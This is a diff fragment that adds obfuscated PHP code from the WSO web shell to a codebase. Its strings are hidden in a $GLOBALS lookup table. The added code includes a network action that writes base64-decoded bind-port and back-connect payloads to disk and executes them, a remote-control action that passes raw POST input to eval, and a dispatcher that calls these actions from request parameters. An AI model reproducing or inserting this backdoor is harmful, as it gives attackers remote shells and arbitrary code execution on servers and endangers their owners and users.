+            echo $GLOBALS[ям][0x30c];
+            echo $GLOBALS[ям][0x30d];
+        }
+        echo $GLOBALS[ям][0x30e];
+        if ($_POST[$GLOBALS[ям][0x1b6]] == $GLOBALS[ям][0x289]) {
+            $db->query($GLOBALS[ям][0x30f]);
+            if ($db->fetch()) {
+                echo $GLOBALS[ям][0x310];
+            }
+        }
+        if (@$_POST[$GLOBALS[ям][0x99]] == $GLOBALS[ям][0x30b]) {
+            $file = $db->loadFile($_POST[$GLOBALS[ям][0x9d]]);
+            echo $GLOBALS[ям][0x311] . htmlspecialchars($file[$GLOBALS[ям][0x1b7]]) . $GLOBALS[ям][0x118];
+        }
+    } else {
+        echo htmlspecialchars($db->error());
+    }
+    echo $GLOBALS[ям][0x180];
+    wsoFooter();
+}
+function actionNetwork()
+{
+    wsoHeader();
+    $back_connect_p = $GLOBALS[ям][0x312];
+    $bind_port_p = $GLOBALS[ям][0x313];
+    echo $GLOBALS[ям][0x314] . $_SERVER[$GLOBALS[ям][0xec]] . $GLOBALS[ям][0x315];
+    if (isset($_POST[$GLOBALS[ям][0x99]])) {
+        function cf($f, $t)
+        {
+            $w = @fopen($f, $GLOBALS[ям][0x246]) || @function_exists($GLOBALS[ям][0x316]);
+            if ($w) {
+                @fwrite($w, @base64_decode($t));
+                @fclose($w);
+            }
+        }
+        if ($_POST[$GLOBALS[ям][0x99]] == $GLOBALS[ям][0x317]) {
+            cf($GLOBALS[ям][0x318], $bind_port_p);
+            $out = wsoEx($GLOBALS[ям][0x319] . $_POST[$GLOBALS[ям][0x9d]] . $GLOBALS[ям][0x31a]);
+            sleep(0x1);
+            echo "<pre class=ml1>{$out}\n" . wsoEx($GLOBALS[ям][0x31b]) . $GLOBALS[ям][0x31c];
+            unlink($GLOBALS[ям][0x318]);
+        }
+        if ($_POST[$GLOBALS[ям][0x99]] == $GLOBALS[ям][0x31d]) {
+            cf($GLOBALS[ям][0x31e], $back_connect_p);
+            $out = wsoEx($GLOBALS[ям][0x31f] . $_POST[$GLOBALS[ям][0x9d]] . $GLOBALS[ям][0x320] . $_POST[$GLOBALS[ям][0x9f]] . $GLOBALS[ям][0x31a]);
+            sleep(0x1);
+            echo "<pre class=ml1>{$out}\n" . wsoEx($GLOBALS[ям][0x321]) . $GLOBALS[ям][0x31c];
+            unlink($GLOBALS[ям][0x31e]);
+        }
+    }
+    echo $GLOBALS[ям][0x180];
+    wsoFooter();
+}
+function actionUPDate()
+{
+    wsoHeader();
+    echo("Updated");
+ 
+    wsoFooter();
+}
+function actionRC()
+{
+    if (!@$_POST[$GLOBALS[ям][0x99]]) {
+        $a = array($GLOBALS[ям][0x328] => php_uname(), $GLOBALS[ям][0x329] => phpversion(), $GLOBALS[ям][0x32a] => WSO_VERSION, $GLOBALS[ям][0x32b] => @ini_get($GLOBALS[ям][0x1b]));
+        echo serialize($a);
+    } else {
+        eval($_POST[$GLOBALS[ям][0x99]]);
+    }
+}
+if (empty($_POST[$GLOBALS[ям][0x96]])) {
+    if (isset($default_action) && function_exists($GLOBALS[ям][0x32c] . $default_action)) {
+        $_POST[$GLOBALS[ям][0x96]] = $default_action;
+    } else {
+        $_POST[$GLOBALS[ям][0x96]] = $GLOBALS[ям][0xb7];
+    }
+}
+if (!empty($_POST[$GLOBALS[ям][0x96]]) && function_exists($GLOBALS[ям][0x32c] . $_POST[$GLOBALS[ям][0x96]])) {
+    call_user_func($GLOBALS[ям][0x32c] . $_POST[$GLOBALS[ям][0x96]]);
+}
+exit;
